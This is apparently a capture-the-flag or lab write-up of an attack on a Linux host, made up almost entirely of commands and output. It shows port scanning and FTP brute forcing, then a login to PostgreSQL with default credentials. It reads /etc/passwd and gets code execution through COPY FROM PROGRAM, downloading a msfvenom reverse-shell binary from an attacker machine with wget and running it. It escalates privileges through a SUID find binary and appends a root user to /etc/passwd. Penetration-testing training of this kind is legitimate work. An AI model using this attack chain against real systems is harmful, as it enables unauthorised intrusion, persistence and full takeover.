## IP ADDRESS
```bash
192.168.179.47

# Set Variables
$ip=192.168.179.47
$url=http://$ip
```
## OPEN PORTS
```bash
21/tcp   open   ftp          syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open   ssh          syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open   http         syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
139/tcp  closed netbios-ssn  reset ttl 61
445/tcp  closed microsoft-ds reset ttl 61
5437/tcp open   postgresql   syn-ack ttl 61 PostgreSQL DB 11.3 - 11.9
```
## NMAP OUTPUT
```bash
# Nmap 7.94SVN scan initiated Thu Nov 14 21:46:25 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.179.47
PORT     STATE  SERVICE      REASON         VERSION
21/tcp   open   ftp          syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open   ssh          syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDJgyzpWrB8SyLb/XmPYQYzsnfizW7d0aNZHpwQ9ivcHQ/RYLbCc8yUIQGN2JMqCgfSj8CRMA36UnV8jnngjkw9njcgMyA5qc1mO4tzzH7VNkW2t5AmP7Q1HBt+SThlLa0JxBN6Gd5BOPwrsk9YTjLj8ax2ncvGBq8jzQjYmm9jF4VgBak5DY+Q5JWdf9krumSlR+V8yneV9aQ6sVy2XgkCJQLQ8GoUTm/13XUTc3TCKQ2KOJ2FzA8VcNTfxqTDxalwnYrZ1tod7BRfMeff5MwxC5gzeB+hdOVC0zAZlvNtMxH6SCxMBRCoX9IHL27E6WtSGXCj1SLYJWrFImjp+I1L
|   256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM7uIYLogPsKP+c0QrezqQfB94ml7djfUOtG8ZAoMX6yK898l0TbgyAShcQSmdOsSMGdSO4GZpixCFJdsYkBi0M=
|   256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKoHnGdMtb37ORTRBt2cTfWvQE7IB3fF3ewP/1tqn0JF
80/tcp   open   http         syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Enter a title, displayed at the top of the window.
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
139/tcp  closed netbios-ssn  reset ttl 61
445/tcp  closed microsoft-ds reset ttl 61
5437/tcp open   postgresql   syn-ack ttl 61 PostgreSQL DB 11.3 - 11.9
| ssl-cert: Subject: commonName=debian
| Subject Alternative Name: DNS:debian
| Issuer: commonName=debian
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-04-27T15:41:47
| Not valid after:  2030-04-25T15:41:47
| MD5:   b086:6d30:4913:684e:16c1:8348:fc76:fe43
| SHA-1: cb30:5109:0fc1:14ab:0fb9:8e55:5874:4bb5:ba57:66af
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUYoM4kALX3eWKWuCQ1/K5FujVbGowDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGZGViaWFuMB4XDTIwMDQyNzE1NDE0N1oXDTMwMDQyNTE1
| NDE0N1owETEPMA0GA1UEAwwGZGViaWFuMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAkpSVo7cfTt1CRy7yDV5Nr2dOJxIyg3JdaE+Mdtsw7/cbPaucXy/L
| fYOoyUsSINbZtIV6/WEpFVD+fIWwPoPWsgazcnNF0Z1quuxOjXnmZICvVqku5vHk
| Q+facbUNjGpz9OMC4s0y/T7uHH6psPoBBgL5ZVTNvU6tK/CnvjtPpMgQ+bOkIqsM
| mMxQnUILBBfUdaVfgetlPCc1qg4+fq0ZCP/d0vjIlb6kA3AuprjFo2xpLwtbx0RM
| BXkmm+STQRTxYnY62MRiL52tzACWfI7lml8LnUFP98tpPzT/0UCBx8cLLNrGlhQP
| ZZb7sALAS8hjpOcIjvRT+ZfXKHHma5RvGQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBmRlYmlhbjANBgkqhkiG9w0BAQsFAAOCAQEAJ1f62YGJW8Ds0e31
| s6hlCQX0kpn5+UXbTMMkjkBWp54aPg6YjUbg4py/E+gJtDWDv/Z8bT+ggiHdIQLf
| +99KE7ShNlnn+hiI4MYjza5rl2W00taN0PiYcKpz898aQ/4Kmho5wkYz+s1bi87O
| 5/IphYJXZYLOLf3CzuWzCT5RUBKZO/BVX79kqJvOLH2xJOkRwA9mgNh5QY0CBzCk
| NVOoDL+Yhof2sZs/UetiW//U8Mtiz22rQWmU4l/tU/X8rUAJQYOCmohGCXnU3aN2
| 6VSDkryCvRWChxwJtqXdKEMZ03E/zr35LhqLWmQmRSEjeVw10HN3g6Y1NpAKV1+g
| rFaQxA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## ENUMERATION
```bash
# 21/tcp   open   ftp          syn-ack ttl 61 vsftpd 3.0.3
-----------------------------------------------------------
- checking anonymous login 
sudo ftp ftp://anonymous:anonymous@$ip
	- Login Failed

- Bruteforce default credentials
sudo hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f ftp://$ip
	- 0 valid password found
- No Progress

# 80/tcp   open   http         syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
------------------------------------------------------------------------------
- Fuzzing 
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -of md -o fuzz/ffuf-raft-large-files -fc 403,404 -u $url/FUZZ
index.html              [Status: 200, Size: 1272, Words: 178, Lines: 30, Duration: 37ms]
page2.html              [Status: 200, Size: 4115, Words: 617, Lines: 170, Duration: 36ms]
- No Progress

# 5437/tcp open   postgresql   syn-ack ttl 61 PostgreSQL DB 11.3 - 11.9
------------------------------------------------------------------------
# Reference - https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
- Login using default postgresql credentials - postgres:postgres
sudo psql -h $ip -p 5437 -U postgres
Password: postgres
psql (17.0 (Debian 17.0-1+b2), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
postgres# 


# 22/tcp   open   ssh          syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
--------------------------------------------------------------------------------------------
```
## INITIAL FOOTHOLD
```bash
# Reference - https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql

# List database
postgres# \list

# Read file /etc/passwd
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;

# Found users
root:x:0:0:root:/root:/bin/bash                                                                                                                          
wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

# Check Permission of postgres
postgres# \du
Role name |                         Attributes                          
-----------+------------------------------------------------------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS    

# Superuser - able to execute commands
# Reverse shell - host on Port 80 and download
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.203 LPORT=80 -f elf -o shell.elf

sudo python3 -m http.server 80
192.168.179.47 - - [14/Nov/2024 22:29:22] "GET /shell.elf HTTP/1.1" 200 -
^C

# RCE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'wget 192.168.45.203/shell.elf';
COPY 0
postgres=# SELECT * FROM cmd_exec;
 cmd_output 
------------
(0 rows)

postgres=# DROP TABLE IF EXISTS cmd_exec;
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM 'chmod +x ./shell.elf';
COPY 0
postgres=# SELECT * FROM cmd_exec;
 cmd_output 
------------
(0 rows)

# Listener on port 80
sudo nc -nvlp 80

postgres=# DROP TABLE IF EXISTS cmd_exec;
DROP TABLE
postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM './shell.elf';

# postgres shell
id
uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)                        
```
## PRIVILEGE ESCALATION
```bash
# Reference
https://gtfobins.github.io/gtfobins/find/#suid

# SUID
find / -perm -u=s -type f 2>/dev/null
- Found
/usr/bin/find

# Privesc
/usr/bin/find . -exec /bin/sh -p \; -quit
id
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)

# euid=0(root)

# Create an entry on /etc/passwd with creds newroot:password
newroot:B5Ihtdc111Eqk:0:0:root:/root:/bin/bash

# Proper root shell
echo "newroot:B5Ihtdc111Eqk:0:0:root:/root:/bin/bash" >> /etc/passwd

su newroot
Passoword: password
# root
```
